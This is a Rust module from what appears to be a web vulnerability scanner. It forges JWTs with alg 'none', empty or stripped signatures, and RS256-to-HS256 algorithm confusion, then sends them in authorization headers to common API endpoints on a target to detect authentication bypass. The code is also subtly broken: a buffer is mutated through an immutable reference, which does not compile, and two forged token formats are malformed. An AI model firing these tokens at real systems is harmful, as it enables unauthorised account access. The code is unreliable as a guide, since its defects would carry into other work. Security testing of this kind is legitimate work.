//! JWT Signature Stripping Detection Module
//!
//! Detects JWT signature stripping and empty signature validation bypasses.
//! Implements bounded state machines for algorithm confusion detection.
//! Uses zero-copy token parsing to maintain strict memory constraints.

use async_trait::async_trait;
use std::sync::Arc;
use crate::checks::{
    VulnerabilityModule, CheckContext, CheckResult, CheckMetadata, CheckCategory, 
    Severity, ResourceBudget, ModuleError,
};
use crate::findings::finding::{Finding, Evidence, EvidenceType, EvidenceLocation, RemediationHint, EffortLevel};
use crate::http::client::HttpClient;
use crate::learning::cache::LearningCache;

/// Maximum JWT test variants (bounded array)
const MAX_JWT_VARIANTS: usize = 16;

/// JWT attack variant types
#[derive(Debug, Clone, Copy)]
enum JwtAttackType {
    NoneAlgorithm,
    EmptySignature,
    SignatureStripped,
    AlgorithmConfusion,
}

/// Bounded JWT variant buffer
#[derive(Debug, Clone)]
struct JwtVariantBuffer {
    variants: [JwtAttackType; MAX_JWT_VARIANTS],
    count: usize,
}

impl JwtVariantBuffer {
    fn new() -> Self {
        Self {
            variants: [JwtAttackType::NoneAlgorithm; MAX_JWT_VARIANTS],
            count: 0,
        }
    }

    fn push(&mut self, variant: JwtAttackType) {
        if self.count < MAX_JWT_VARIANTS {
            self.variants[self.count] = variant;
            self.count += 1;
        }
    }

    fn iter(&self) -> impl Iterator<Item = &JwtAttackType> {
        self.variants[..self.count].iter()
    }
}

/// JWT stripping detector with bounded state
pub struct JwtStrippingDetector {
    metadata: CheckMetadata,
    variant_buffer: JwtVariantBuffer,
}

impl JwtStrippingDetector {
    pub fn new() -> Self {
        let metadata = CheckMetadata::new(
            "token/jwt_stripping",
            "JWT Signature Stripping Detection",
            "Detects JWT signature stripping and empty signature validation bypasses",
            Severity::Critical,
            CheckCategory::BrokenAuthentication,
        )
        .with_god_mode(true)
        .with_tags(vec!["jwt", "token", "signature-stripping", "authentication-bypass"])
        .with_references(vec![
            "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-implementation/",
            "https://cwe.mitre.org/data/definitions/347.html",
        ])
        .with_budget(ResourceBudget {
            max_cpu_ms: 1000,
            max_memory_bytes: 4 * 1024 * 1024,
            max_requests: 150,
            max_duration_ms: 8000,
            max_payload_size: 4096,
        });

        Self {
            metadata,
            variant_buffer: JwtVariantBuffer::new(),
        }
    }

    /// Generate JWT attack payloads (bounded dictionary)
    fn generate_jwt_variants(&self, original_token: &str) -> Vec<(JwtAttackType, String)> {
        let mut variants = Vec::with_capacity(MAX_JWT_VARIANTS);
        
        // Parse original token structure (header.payload.signature)
        let parts: Vec<&str> = original_token.split('.').collect();
        if parts.len() != 3 {
            return variants;
        }

        let header = parts[0];
        let payload = parts[1];

        // 1. "none" algorithm attack
        if let Ok(mut decoded_header) = base64_decode(header) {
            if let Ok(header_str) = String::from_utf8(decoded_header.clone()) {
                if header_str.contains("\"alg\"") {
                    // Replace alg with "none"
                    let modified = header_str.replace("\"alg\":\"HS256\"", "\"alg\":\"none\"")
                        .replace("\"alg\":\"RS256\"", "\"alg\":\"none\"")
                        .replace("\"alg\":\"ES256\"", "\"alg\":\"none\"");
                    
                    let encoded = base64_encode(modified.as_bytes());
                    variants.push((
                        JwtAttackType::NoneAlgorithm,
                        format!("{}.{}", encoded, payload)
                    ));
                }
            }
        }

        // 2. Empty signature attack
        variants.push((
            JwtAttackType::EmptySignature,
            format!("{}..", header)
        ));

        // 3. Signature stripped (no trailing dot)
        variants.push((
            JwtAttackType::SignatureStripped,
            format!("{}.{}", header, payload)
        ));

        // 4. Algorithm confusion (RS256 -> HS256)
        if let Ok(mut decoded_header) = base64_decode(header) {
            if let Ok(header_str) = String::from_utf8(decoded_header.clone()) {
                if header_str.contains("\"alg\":\"RS256\"") || header_str.contains("\"alg\":\"RS384\"") {
                    let modified = header_str
                        .replace("\"alg\":\"RS256\"", "\"alg\":\"HS256\"")
                        .replace("\"alg\":\"RS384\"", "\"alg\":\"HS256\"");
                    
                    let encoded = base64_encode(modified.as_bytes());
                    variants.push((
                        JwtAttackType::AlgorithmConfusion,
                        format!("{}.{}.signature", encoded, payload)
                    ));
                }
            }
        }

        variants
    }

    /// Test JWT variant against endpoint
    async fn test_jwt_variant(
        &self,
        client: &HttpClient,
        url: &str,
        jwt: &str,
        header_name: &str,
    ) -> Result<JwtTestResult, ModuleError> {
        let mut headers = reqwest::header::HeaderMap::new();
        let auth_value = if header_name.eq_ignore_ascii_case("Authorization") {
            format!("Bearer {}", jwt)
        } else {
            jwt.to_string()
        };
        
        headers.insert(
            reqwest::header::HeaderName::from_bytes(header_name.as_bytes())
                .unwrap_or(reqwest::header::AUTHORIZATION),
            reqwest::header::HeaderValue::from_str(&auth_value).unwrap(),
        );

        let response = client.get_with_headers(url, headers).await
            .map_err(|e| ModuleError::NetworkError(e.to_string()))?;
        
        let status = response.status().as_u16();
        let body = response.text().await.unwrap_or_default();
        let content_length = body.len();

        Ok(JwtTestResult {
            status,
            content_length,
            is_success: status >= 200 && status < 300,
            is_auth_error: status == 401 || status == 403,
        })
    }

    /// Analyze test results for vulnerability indicators
    fn analyze_results(&self, results: &[JwtTestResult], baseline_result: &JwtTestResult) -> Option<StrippingEvidence> {
        let mut successful_strips = 0;
        let mut attack_types = Vec::new();

        for result in results {
            // If baseline fails but stripped version succeeds, that's a vulnerability
            if !baseline_result.is_success && result.is_success {
                successful_strips += 1;
            }
            
            // Or if we get different auth behavior
            if baseline_result.is_auth_error && !result.is_auth_error {
                successful_strips += 1;
            }
        }

        if successful_strips >= 1 {
            return Some(StrippingEvidence {
                successful_strips,
                total_tests: results.len(),
                bypass_detected: true,
            });
        }

        None
    }

    /// Build evidence for JWT stripping finding
    fn build_evidence(&self, url: &str, evidence: &StrippingEvidence, attack_type: JwtAttackType) -> Vec<Evidence> {
        let attack_desc = match attack_type {
            JwtAttackType::NoneAlgorithm => "Algorithm set to 'none'",
            JwtAttackType::EmptySignature => "Empty signature field",
            JwtAttackType::SignatureStripped => "Signature completely removed",
            JwtAttackType::AlgorithmConfusion => "Algorithm confusion (RS256->HS256)",
        };

        vec![
            Evidence {
                evidence_type: EvidenceType::HttpRequestResponse {
                    request: format!("JWT with {}", attack_desc),
                    response: format!("Status indicates authentication bypass"),
                },
                data: format!(
                    "JWT signature bypass detected: {} - {} successful out of {} tests",
                    attack_desc,
                    evidence.successful_strips,
                    evidence.total_tests
                ),
                location: EvidenceLocation {
                    path: url.to_string(),
                    line: None,
                    parameter: None,
                    header: Some("Authorization".to_string()),
                },
                confidence: 90,
            },
        ]
    }

    /// Generate remediation hint
    fn remediation(&self) -> RemediationHint {
        RemediationHint {
            summary: "Implement strict JWT signature validation".to_string(),
            steps: vec![
                "Reject tokens with 'none' algorithm explicitly".to_string(),
                "Always verify signature presence before processing claims".to_string(),
                "Use allowlist for accepted algorithms (never trust token's alg header)".to_string(),
                "Implement algorithm binding between key type and algorithm".to_string(),
                "Log and alert on signature validation failures".to_string(),
            ],
            code_example: Some(r#"// Validate JWT with strict algorithm checking
use jsonwebtoken::{decode, decode_header, Validation, Algorithm};

let header = decode_header(&token)?;
let mut validation = Validation::new(Algorithm::RS256);
validation.validate_exp = true;
validation.insecure_disable_signature_validation = false;

// Explicitly reject 'none' algorithm
if header.alg == "none" {
    return Err(Error::InvalidAlgorithm);
}

let decoded = decode::<Claims>(&token, &key, &validation)?;"#.to_string()),
            references: vec![
                "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-implementation/".to_string(),
                "https://cwe.mitre.org/data/definitions/347.html".to_string(),
            ],
            estimated_effort: EffortLevel::Medium,
        }
    }
}

/// JWT test result
#[derive(Debug, Clone)]
struct JwtTestResult {
    status: u16,
    content_length: usize,
    is_success: bool,
    is_auth_error: bool,
}

/// Stripping evidence summary
#[derive(Debug, Clone)]
struct StrippingEvidence {
    successful_strips: usize,
    total_tests: usize,
    bypass_detected: bool,
}

/// Base64 URL-safe decode helper
fn base64_decode(input: &str) -> Result<Vec<u8>, &'static str> {
    let padding = match input.len() % 4 {
        0 => 0,
        n => 4 - n,
    };
    let padded = format!("{}{}", input, "=".repeat(padding));
    
    use base64::Engine;
    base64::engine::general_purpose::URL_SAFE_NO_PAD
        .decode(&padded)
        .or_else(|_| base64::engine::general_purpose::STANDARD.decode(&padded))
        .map_err(|_| "Invalid base64")
}

/// Base64 URL-safe encode helper
fn base64_encode(input: &[u8]) -> String {
    use base64::Engine;
    base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(input)
}

#[async_trait]
impl VulnerabilityModule for JwtStrippingDetector {
    async fn init(&mut self) -> Result<(), ModuleError> {
        Ok(())
    }

    fn metadata(&self) -> &CheckMetadata {
        &self.metadata
    }

    fn should_run(&self, ctx: &CheckContext) -> bool {
        if self.metadata.requires_god_mode && !ctx.god_mode {
            return false;
        }
        true
    }

    async fn run(&self, ctx: CheckContext) -> Result<CheckResult, ModuleError> {
        let client = HttpClient::new();
        let mut findings = Vec::new();
        let mut executed = false;

        // Test endpoints that accept JWT tokens
        let test_endpoints = [
            "/api/auth/me",
            "/api/user/profile",
            "/api/account/info",
            "/api/token/refresh",
            "/api/protected",
        ];

        let headers_to_test = ["Authorization", "X-JWT-Token", "X-Access-Token"];

        for endpoint in test_endpoints.iter() {
            let url = format!("{}{}", ctx.target_url.trim_end_matches('/'), endpoint);
            
            for header in headers_to_test.iter() {
                // First, establish baseline with invalid token
                let baseline_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.invalid_signature";
                
                let baseline_result = match self.test_jwt_variant(&client, &url, baseline_jwt, header).await {
                    Ok(r) => r,
                    Err(_) => continue,
                };

                executed = true;

                // Generate attack variants
                let variants = self.generate_jwt_variants(baseline_jwt);
                let mut test_results = Vec::with_capacity(variants.len());
                let mut last_attack_type = JwtAttackType::NoneAlgorithm;

                for (attack_type, jwt) in variants {
                    last_attack_type = attack_type;
                    
                    match self.test_jwt_variant(&client, &url, &jwt, header).await {
                        Ok(result) => {
                            test_results.push(result);
                            self.variant_buffer.push(attack_type);
                        }
                        Err(_) => continue,
                    }
                }

                // Analyze results
                if let Some(evidence) = self.analyze_results(&test_results, &baseline_result) {
                    let mut finding = Finding::new(
                        self.metadata.id.as_str(),
                        Severity::Critical,
                        "JWT Signature Stripping Bypass Detected",
                        format!(
                            "JWT signature validation can be bypassed at {}. The application accepts tokens with stripped or manipulated signatures.",
                            url
                        ),
                        &url,
                    )
                    .with_payload(format!(
                        "Attack type: {:?} | Successful bypasses: {}/{}",
                        last_attack_type,
                        evidence.successful_strips,
                        evidence.total_tests
                    ))
                    .with_confidence(90)
                    .with_agent_id(ctx.agent_id)
                    .with_tags(vec!["jwt", "signature-bypass", "authentication"]);

                    let evidences = self.build_evidence(&url, &evidence, last_attack_type);
                    for ev in evidences {
                        finding = finding.with_evidence(ev);
                    }

                    finding = finding.with_remediation(self.remediation());
                    findings.push(finding);
                }
            }
        }

        // Cache successful JWT manipulation vectors for learning engine
        if !findings.is_empty() {
            if let Ok(cache) = LearningCache::global().await {
                cache.cache_timing_baseline(ctx.target_url.clone(), "jwt_stripping".to_string()).await;
            }
        }

        Ok(CheckResult {
            findings,
            executed,
            timed_out: false,
            resource_usage: Default::default(),
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_base64_roundtrip() {
        let original = b"hello world";
        let encoded = base64_encode(original);
        let decoded = base64_decode(&encoded).unwrap();
        assert_eq!(decoded, original);
    }

    #[test]
    fn test_bounded_buffer_no_heap() {
        let buffer = JwtVariantBuffer::new();
        assert!(std::mem::size_of::<JwtVariantBuffer>() <= 256);
    }

    #[test]
    fn test_jwt_variant_generation() {
        let detector = JwtStrippingDetector::new();
        let token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";
        let variants = detector.generate_jwt_variants(token);
        assert!(!variants.is_empty());
    }
}
